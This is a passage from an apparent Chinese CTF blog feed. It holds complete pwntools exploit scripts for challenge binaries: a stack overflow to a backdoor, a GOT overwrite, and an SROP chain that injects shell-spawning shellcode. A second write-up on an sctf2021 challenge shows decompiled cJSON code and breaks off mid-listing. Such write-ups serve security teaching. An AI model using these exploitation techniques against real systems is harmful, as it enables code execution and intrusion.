exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/02/20 11:12:39</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./Ez_pwn'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">ip_port=[<span class="string">'hsc2019.site'</span>,<span class="number">10366</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">0x40</span>+<span class="string">'2'</span>*<span class="number">8</span>+p64(e.sym[<span class="string">'backdoor'</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="EZPWN"><a href="#EZPWN" class="headerlink" title="EZPWN"></a>EZPWN</h2><p>题目给了后门。分析程序流程，发现题目有个任意执行写，篡改put函数的got表值虫二劫持got表运行后门</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/02/20 11:21:21</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./EZPWN'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">ip_port=[<span class="string">'hsc2019.site'</span>,<span class="number">10027</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'your ID?'</span>)</span><br><span class="line">p.sendline(<span class="string">'xxxxx'</span>)</span><br><span class="line">debug()</span><br><span class="line">p.recvuntil(<span class="string">'Give me the target address?'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x601018</span>))</span><br><span class="line">p.recvuntil(<span class="string">'Give me the data:'</span>)</span><br><span class="line">p.sendline(p64(e.sym[<span class="string">'success'</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="SAHELL"><a href="#SAHELL" class="headerlink" title="SAHELL"></a>SAHELL</h2><p>题目欺诈，实际上考的是SROT与写shell。</p><p>即及利用SPOT在一块可以控制地址区域写入shellcode，让后再调用shellcode。</p><p>但要注意的是这里连续调用两次syscall.</p><p>第一次我们利用syscall  通过SYS_rt_sigreturn 劫持栈与程序流。</p><p>但是SYS_rt_sigreturn的系统调用号为<code>0xf</code>.</p><p>因此我们用利用x64下系统调用read的返回值为输入字符数来篡改返回值（rax）为<code>0xf</code></p><p>同时，由于我们连续调用syscall，且rt_sigreturn破坏原本栈结构。我们伪造的<code>signal Frame</code>也要注意各寄存器外，<code>uc_stack</code>和<code>Segment Registers(SS, FS, GS, CS)</code>等参数也要注意实际情况。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#推荐模板：</span></span><br><span class="line">sigret_frame = [</span><br><span class="line">    p64(<span class="number">0x0000000000000007</span>),   <span class="comment"># uc_flags</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># uc_link</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># uc_stack.ss_sp</span></span><br><span class="line">    p64(<span class="number">0x0000ffff00000000</span>),   <span class="comment"># uc_stack.ss_flags</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># uc_stack.ss_size</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R8</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R9</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R10</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R11</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R12</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R13</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R14</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R15</span></span><br><span class="line">    p64(<span class="number">0x0000000000402000</span>),   <span class="comment"># RDI</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># RSI</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># RBP</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># RBX</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># RDX</span></span><br><span class="line">    p64(<span class="number">0x000000000000003b</span>),   <span class="comment"># RAX</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># RCX</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># RSP</span></span><br><span class="line">    p64(SYSCALL),   <span class="comment"># RIP = should call 'syscall' instruction</span></span><br><span class="line">    p64(<span class="number">0x0000000000000202</span>),   <span class="comment"># EFLAGS</span></span><br><span class="line">    p64(<span class="number">0x002b000000000033</span>),   <span class="comment"># Segment Registers(SS, FS, GS, CS)</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># ERR</span></span><br><span class="line">    p64(<span class="number">0x0000000000000001</span>),   <span class="comment"># TrapNo</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># Old-Mask</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># CR2</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># fpstate = NULL</span></span><br><span class="line">    p64(<span class="number">0x000000000000000e</span>),   <span class="comment"># reserved</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># uc_sigmask</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>同时，由于SYS_rt_sigreturn的返回值刚好为0，即read的系统调用号，我们就可以直接将RIP修改为syscall地址。就可以执行sys_read调用写入并指向shellcode</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/02/20 11:39:04</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./SAHELL'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">ip_port=[<span class="string">'hsc2019.site'</span>,<span class="number">10774</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#debug('b main')</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">shellcodeaddr=<span class="number">0x00600000</span></span><br><span class="line">rbp=shellcodeaddr</span><br><span class="line"><span class="comment">#asm(shellcraft.sh())</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">sigret_frame = [</span></span><br><span class="line"><span class="string">    p64(0x0000000000000007),   # uc_flags</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # uc_link</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # uc_stack.ss_sp</span></span><br><span class="line"><span class="string">    p64(0x0000ffff00000000),   # uc_stack.ss_flags</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # uc_stack.ss_size</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R8</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R9</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R10</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R11</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R12</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R13</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R14</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R15</span></span><br><span class="line"><span class="string">    p64(0x0000000000402000),   # RDI</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # RSI</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # RBP</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # RBX</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # RDX</span></span><br><span class="line"><span class="string">    p64(0x000000000000003b),   # RAX</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # RCX</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # RSP</span></span><br><span class="line"><span class="string">    p64(SYSCALL),   # RIP = should call 'syscall' instruction</span></span><br><span class="line"><span class="string">    p64(0x0000000000000202),   # EFLAGS</span></span><br><span class="line"><span class="string">    p64(0x002b000000000033),   # Segment Registers(SS, FS, GS, CS)</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # ERR</span></span><br><span class="line"><span class="string">    p64(0x0000000000000001),   # TrapNo</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # Old-Mask</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # CR2</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # fpstate = NULL</span></span><br><span class="line"><span class="string">    p64(0x000000000000000e),   # reserved</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # uc_sigmask</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'x'</span>*<span class="number">0x1a0</span>+p64(<span class="number">0x000000000400108</span><span class="number">-0x50</span>)+p64(<span class="number">0x0000000004000BA</span>)+p64(<span class="number">0x0000000004000B5</span>)+p64(<span class="number">0x0000000000000007</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000ffff00000000</span>)+p64(<span class="number">0x0000000000000000</span>)+<span class="string">'a'</span>*<span class="number">0x28</span>+<span class="string">'b'</span>*<span class="number">0x10</span>+<span class="string">'c'</span>*<span class="number">8</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x600100</span>)+<span class="string">'q'</span>*<span class="number">8</span>+<span class="string">'y'</span>*<span class="number">8</span>+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x600100</span>)+p64(<span class="number">0x0000000004000CB</span>)+p64(<span class="number">0x0000000000000202</span>)+p64(<span class="number">0x002b000000000033</span>)+ p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000000000000001</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x000000000000000e</span>))</span><br><span class="line">sleep(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>*(<span class="number">0xf</span><span class="number">-1</span>))</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'8'</span>*<span class="number">64</span>+p64(<span class="number">0x600148</span>+<span class="number">8</span>)+p64(<span class="number">0</span>)+(asm(shellcraft.sh())))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sctf2021-pwn-dataleak-wp</title>
      <link href="/2021/12/31/sctf2021-pwn-dataleak/"/>
      <url>/2021/12/31/sctf2021-pwn-dataleak/</url>
      
        <content type="html"><![CDATA[<p>周末有事去了，等缓过来只搞个这个题的文件….<a id="more"></a></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RPATH:    '/home/wlz/my_code/sctf_21/pwn_dataleak/src2ctfer/cmake-build-debug'</span><br></pre></td></tr></table></figure><p>分析环境，发现题目没有开启canary,并且自带一个so文件。</p><p>分析主程序流程发现逻辑很简单，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = '_si_siht';</span><br><span class="line">    v9 = '_ni_atad';</span><br><span class="line">    v10 = 'revres';</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    buf = <span class="number">0L</span>L;</span><br><span class="line">    v5 = <span class="number">0L</span>L;</span><br><span class="line">    v6 = <span class="number">0L</span>L;</span><br><span class="line">    v7 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0xE</span>uLL);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;v6, <span class="number">0xE</span>uLL);</span><br><span class="line">    cJSON_Minify(&amp;buf, &amp;v6);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>, &amp;v6, <span class="number">0xB</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两次输入长度达0xe的字符串，然后放入<code>cJSON_Minify</code>函数进行处理。</p><p><code>cJSON_Minify</code>函数在so文件中源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">cJSON_Minify</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// cl</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// cl</span></span><br><span class="line">  _BYTE *v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// cl</span></span><br><span class="line">  _BYTE *v13; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v14; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *str_a1; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *v18; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *last; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v20; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  str_a1 = a1;</span><br><span class="line">  result = a1;</span><br><span class="line">  last = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( *str_a1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( *str_a1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">' '</span>:</span><br><span class="line">          ++str_a1;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'\t'</span>:</span><br><span class="line">          ++str_a1;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'\r'</span>:</span><br><span class="line">          ++str_a1;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'\n'</span>:</span><br><span class="line">          ++str_a1;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">if</span> ( *str_a1 != <span class="string">'/'</span> || str_a1[<span class="number">1</span>] != <span class="string">'/'</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( *str_a1 != <span class="string">'/'</span> || str_a1[<span class="number">1</span>] != <span class="string">'*'</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( *str_a1 == <span class="string">'"'</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v2 = str_a1;</span><br><span class="line">                v18 = str_a1 + <span class="number">1</span>;</span><br><span class="line">                v3 = *v2;</span><br><span class="line">                v4 = last;</span><br><span class="line">                v20 = (<span class="keyword">signed</span> __int64)(last + <span class="number">1</span>);</span><br><span class="line">                *v4 = v3;</span><br><span class="line">                <span class="keyword">while</span> ( *v18 &amp;&amp; *v18 != <span class="string">'"'</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( *v18 == <span class="string">'\\'</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v5 = v18++;</span><br><span class="line">                    v6 = *v5;</span><br><span class="line">                    v7 = (_BYTE *)v20++;</span><br><span class="line">                    *v7 = v6;</span><br><span class="line">                  &#125;</span><br><span class="line">                  v8 = v18++;</span><br><span class="line">                  v9 = *v8;</span><br><span class="line">                  v10 = (_BYTE *)v20++;</span><br><span class="line">                  *v10 = v9;</span><br><span class="line">                &#125;</span><br><span class="line">                v11 = v18;</span><br><span class="line">                str_a1 = v18 + <span class="number">1</span>;</span><br><span class="line">                v12 = *v11;</span><br><span class="line">                v13 = (_BYTE *)v20;</span><br><span class="line">                last = (<span class="keyword">char</span> *)(v20 + <span class="number">1</span>);</span><br><span class="line">                *v13 = v12;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                v14 = str_a1++;</span><br><span class="line">                v15 = *v14;</span><br><span class="line">                v16 = last++;</span><br><span class="line">                *v16 = v15;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span 